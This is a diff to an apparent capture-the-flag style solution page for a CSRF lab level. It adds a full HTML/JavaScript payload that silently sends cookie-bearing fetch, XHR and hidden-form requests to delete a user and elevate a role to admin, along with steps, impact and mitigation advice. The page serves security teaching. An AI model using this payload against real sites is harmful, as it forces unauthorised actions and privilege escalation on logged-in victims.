@@ -9,13 +9,13 @@
             <div class="card-header bg-success text-white">
                 <h2 class="text-center">
                     <i class="bi bi-lightbulb-fill me-2"></i>
-                    Level 7 Solution: Advanced CSRF Level 7
+                    Level 7 Solution: CSRF in AJAX Requests
                 </h2>
             </div>
             <div class="card-body">
                 <div class="alert alert-info">
                     <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
-                    <p>This advanced CSRF challenge demonstrates modern attack techniques and bypass methods.</p>
+                    <p>This challenge demonstrates how to exploit CSRF vulnerabilities in AJAX requests by bypassing CORS restrictions and exploiting the AjaxApp Dashboard interface.</p>
                 </div>
 
                 <div class="card mb-4">
@@ -23,8 +23,8 @@
                         <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
                     </div>
                     <div class="card-body">
-                        <p><strong>Primary Tools:</strong> Burp Suite, Browser Developer Tools, Custom Scripts</p>
-                        <p><strong>Skills:</strong> CSRF exploitation, HTTP request manipulation, Web security testing</p>
+                        <p><strong>Primary Tools:</strong> Browser Developer Tools, Custom HTML/JavaScript, Burp Suite (optional)</p>
+                        <p><strong>Skills:</strong> AJAX CSRF exploitation, CORS understanding, JavaScript fetch API</p>
                     </div>
                 </div>
 
@@ -33,18 +33,92 @@
                         <h4 class="mb-0"><i class="bi bi-list-ol me-2"></i>Step-by-Step Solution</h4>
                     </div>
                     <div class="card-body">
-                        
+
                         <ol>
-                            <li><strong>Reconnaissance:</strong> Analyze the target application and identify CSRF protection mechanisms</li>
-                            <li><strong>Vulnerability Assessment:</strong> Test for CSRF vulnerabilities in critical functions</li>
-                            <li><strong>Bypass Development:</strong> Develop techniques to bypass the implemented protections</li>
-                            <li><strong>Payload Crafting:</strong> Create a malicious payload that exploits the CSRF vulnerability</li>
-                            <li><strong>Attack Execution:</strong> Execute the attack and verify successful exploitation</li>
-                            <li><strong>Impact Assessment:</strong> Document the security impact and potential damage</li>
+                            <li><strong>Analyze AJAX Interface:</strong> Identify that the AjaxApp Dashboard accepts AJAX requests with various HTTP methods</li>
+                            <li><strong>Test CORS Policy:</strong> Determine if the application has proper CORS restrictions for cross-origin requests</li>
+                            <li><strong>Craft AJAX CSRF:</strong> Create JavaScript that makes cross-origin AJAX requests to the vulnerable endpoint</li>
+                            <li><strong>Use Simple Requests:</strong> Leverage "simple requests" that bypass CORS preflight checks</li>
+                            <li><strong>Execute Malicious Action:</strong> Submit a request that performs unauthorized actions via AJAX</li>
+                            <li><strong>Verify Success:</strong> Confirm the CSRF attack succeeded through the application response</li>
                         </ol>
                         <div class="alert alert-warning mt-3">
-                            <strong>Key Insight:</strong> Advanced CSRF attacks require understanding of modern web security mechanisms.
+                            <strong>Key Insight:</strong> AJAX CSRF attacks exploit weak CORS policies and lack of proper request validation.
                         </div>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-success text-white">
+                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>Payload Example</h4>
+                    </div>
+                    <div class="card-body">
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- AJAX CSRF Attack --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h3&gt;Loading...&lt;/h3&gt;
+
+    &lt;script&gt;
+    // Method 1: Using fetch API for AJAX CSRF
+    fetch('http://target.com/csrf/level7', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'ajax_endpoint=/api/admin/delete&request_method=DELETE&ajax_data={"user_id":"victim123"}',
+        credentials: 'include'  // Include cookies for authentication
+    })
+    .then(response =&gt; response.text())
+    .then(data =&gt; {
+        console.log('CSRF attack successful:', data);
+        document.body.innerHTML = '&lt;h3&gt;Action completed successfully!&lt;/h3&gt;';
+    })
+    .catch(error =&gt; {
+        console.error('Error:', error);
+    });
+
+    // Method 2: Using XMLHttpRequest
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://target.com/csrf/level7', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.withCredentials = true;  // Include cookies
+
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            console.log('AJAX CSRF successful:', xhr.responseText);
+        }
+    };
+
+    xhr.send('ajax_endpoint=/api/sensitive/action&request_method=POST&ajax_data={"action":"malicious","target":"admin"}');
+
+    // Method 3: Form submission to trigger AJAX endpoint
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'http://target.com/csrf/level7';
+
+    var input1 = document.createElement('input');
+    input1.type = 'hidden';
+    input1.name = 'ajax_endpoint';
+    input1.value = '/api/user/elevate';
+    form.appendChild(input1);
+
+    var input2 = document.createElement('input');
+    input2.type = 'hidden';
+    input2.name = 'request_method';
+    input2.value = 'PUT';
+    form.appendChild(input2);
+
+    var input3 = document.createElement('input');
+    input3.type = 'hidden';
+    input3.name = 'ajax_data';
+    input3.value = '{"role":"admin","permissions":"all"}';
+    form.appendChild(input3);
+
+    document.body.appendChild(form);
+    form.submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
                     </div>
                 </div>
 
@@ -53,12 +127,13 @@
                         <h4 class="mb-0"><i class="bi bi-shield-exclamation me-2"></i>Security Impact</h4>
                     </div>
                     <div class="card-body">
-                        <p>This CSRF vulnerability demonstrates how attackers can:</p>
+                        <p>AJAX CSRF vulnerabilities allow attackers to:</p>
                         <ul>
-                            <li>Execute unauthorized actions on behalf of authenticated users</li>
-                            <li>Bypass authentication mechanisms through cross-site requests</li>
-                            <li>Potentially compromise user accounts and sensitive data</li>
-                            <li>Perform state-changing operations without user consent</li>
+                            <li>Execute unauthorized API calls and AJAX requests on behalf of authenticated users</li>
+                            <li>Bypass traditional CSRF protections that only cover form submissions</li>
+                            <li>Perform complex multi-step attacks through chained AJAX requests</li>
+                            <li>Access and manipulate JSON/API endpoints without user consent</li>
+                            <li>Exploit weak CORS policies to perform cross-origin attacks</li>
                         </ul>
                     </div>
                 </div>
@@ -69,11 +144,12 @@
                     </div>
                     <div class="card-body">
                         <ul>
-                            <li><strong>CSRF Tokens:</strong> Implement anti-CSRF tokens in all state-changing forms</li>
-                            <li><strong>SameSite Cookies:</strong> Use SameSite cookie attributes to prevent cross-site requests</li>
-                            <li><strong>Origin Validation:</strong> Verify the Origin and Referer headers</li>
-                            <li><strong>Custom Headers:</strong> Require custom headers for AJAX requests</li>
-                            <li><strong>Double Submit Cookies:</strong> Implement double submit cookie pattern</li>
+                            <li><strong>Custom Headers:</strong> Require custom headers (e.g., X-Requested-With) for all AJAX requests</li>
+                            <li><strong>CORS Policy:</strong> Implement strict CORS policies with proper origin validation</li>
+                            <li><strong>CSRF Tokens in AJAX:</strong> Include CSRF tokens in AJAX request headers or body</li>
+                            <li><strong>Content-Type Validation:</strong> Validate Content-Type headers to prevent simple requests</li>
+                            <li><strong>Preflight Requests:</strong> Force preflight requests by using non-simple request methods</li>
+                            <li><strong>SameSite Cookies:</strong> Use SameSite=Strict or SameSite=Lax for session cookies</li>
                         </ul>
                     </div>
                 </div>
